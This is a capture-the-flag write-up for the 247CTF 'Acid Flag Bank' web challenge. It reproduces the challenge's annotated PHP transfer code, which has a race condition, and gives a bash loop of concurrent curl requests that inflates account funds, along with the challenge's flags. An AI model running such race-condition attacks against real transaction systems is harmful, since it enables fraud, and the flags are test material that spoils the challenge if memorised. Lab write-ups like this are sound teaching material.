# Web: Acid Flag Bank

## Previous Flag
```
247CTF{4be4e08685e2ed433dde9171e887761e}
```

## Goal
You can purchase a flag directly from the ACID flag bank, however there aren't enough funds in the entire bank to complete that transaction! Can you identify any vulnerabilities within the ACID flag bank which enable you to increase the total available funds?

## What I learned
```
ACID stands for Atomicity, Consistency, Isolation and Durability, principles that application must adhere to avoid vulnerabilities

Got to be quick, Best to transfer in terminal faster than f5
Browser: https://81a9a62ca97877e3.247ctf.com/?to=2\&from=1\&amount=50
Funds transferred!
Browser: https://81a9a62ca97877e3.247ctf.com/?to=1\&from=2\&amount=50
Funds transferred!
Browser: https://81a9a62ca97877e3.247ctf.com/?dump
ID FUNDS
1  247
2  0
Browser: https://81a9a62ca97877e3.247ctf.com/?reset                 # Only do this if screwed up
Funds updated!
```

## Solution
```
START CHALLENGE

https://81a9a62ca97877e3.247ctf.com/

<?php
require_once('flag.php');                                 # Include flag.php file, setting $flag variable

class ChallDB 
{
    public function __construct($flag) 
    {
        $this->pdo = new SQLite3('/tmp/users.db');        # Load the database from a file
        $this->flag = $flag; # Assign the instance variable "flag" to be the flag variable we imported earlier
    }
 
    public function updateFunds($id, $funds)              # Pass two parameters to the variable, $id and $funds
    {
        $stmt = $this->pdo->prepare('update users set funds = :funds where id = :id'); # Define the initial query
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);    # Insert said variables into the previously stated query
        $stmt->bindValue(':funds', $funds, SQLITE3_INTEGER);
        return $stmt->execute();                          # Run the query
    }

    public function resetFunds()
    {
        $this->updateFunds(1, 247);                       # Reset the funds in the database
        $this->updateFunds(2, 0);
        return "Funds updated!";
    }

    public function getFunds($id)
    {
        $stmt = $this->pdo->prepare('select funds from users where id = :id'); # Select all funds from users table where id matches what we pass the function
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt->execute();
        return $result->fetchArray(SQLITE3_ASSOC)['funds']; # Return "funds" column from the database output
    }

    public function validUser($id)
    {
        $stmt = $this->pdo->prepare('select count(*) as valid from users where id = :id'); # Select the number of rows returned when looking for the user where the id's match
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt->execute();
        $row = $result->fetchArray(SQLITE3_ASSOC); 
        return $row['valid'] == true;                         # If the row is valid, then return true
    }

    public function dumpUsers()
    {
        $result = $this->pdo->query("select id, funds from users");
        echo "<pre>";
        echo "ID FUNDS\n";
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            echo "{$row['id']}  {$row['funds']}\n";
        }
        echo "</pre>";
    }

    public function buyFlag($id)
    {
        if ($this->validUser($id) && $this->getFunds($id) > 247) { # If user is valid and the funds are greater than 247
            return $this->flag; 👀
        } else {
            return "Insufficient funds!";
        }
    }

    public function clean($x)
    {
        return round((int)trim($x));
    }
}

$db = new challDB($flag);                                         # Create instance
if (isset($_GET['dump'])) {                                       # Dump user data 🐱‍💻
    $db->dumpUsers();
} elseif (isset($_GET['reset'])) {                                # Reset the table 🐱‍💻
    echo $db->resetFunds();
} elseif (isset($_GET['flag'], $_GET['from'])) {                  # If flag and from get parameters are set then 🐱‍💻
    $from = $db->clean($_GET['from']);                            # Run "clean" function on the value in the from parameter
    echo $db->buyFlag($from);                                     # echo output from running byflag with the from get param
} elseif (isset($_GET['to'],$_GET['from'],$_GET['amount'])) {     # If to, from and amount are set then 🐱‍💻
    $to = $db->clean($_GET['to']); # Assign the variables
    $from = $db->clean($_GET['from']);
    $amount = $db->clean($_GET['amount']);                        🐱‍💻
    if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) { # If to and from id's arent the same, and the amount is greater than 0 but smaller than 247, and both the to and from addresses are valid, and the from address has enough in their bank.
        $db->updateFunds($from, $db->getFunds($from) - $amount); # Update the values in the database
        $db->updateFunds($to, $db->getFunds($to) + $amount);
        echo "Funds transferred!";
    } else {
        echo "Invalid transfer request!";
    }
} else {
    echo highlight_file(__FILE__, true);                          # Show this source code
}

# Method 1: Keep transfering from 1 to 2 so doesn't get checked
AsianHacker-picoctf@webshell:/tmp$ for i in $(seq 15); do    curl -s 'https://81a9a62ca97877e3.247ctf.com/?to=2&from=1&amount=50' &   curl -s 'https://81a9a62ca97877e3.247ctf.com/?to=1&from=2&amount=50' &   curl -s 'https://81a9a62ca97877e3.247ctf.com/?to=2&from=1&amount=50' & done

# Mean while do dump in browser, keep updating w/ dump until get around 300 in 2nd account
https://81a9a62ca97877e3.247ctf.com/?dump
ID FUNDS
1  47
2  300

Browser: https://81a9a62ca97877e3.247ctf.com/?flag&from=2
247CTF{7cc47319f32d13b2fd9ba542a2670d71} 🔐
```

## Flag
247CTF{7cc47319f32d13b2fd9ba542a2670d71}

## Continue
[Continue](../247ctf/WebTheTwigInjector.md)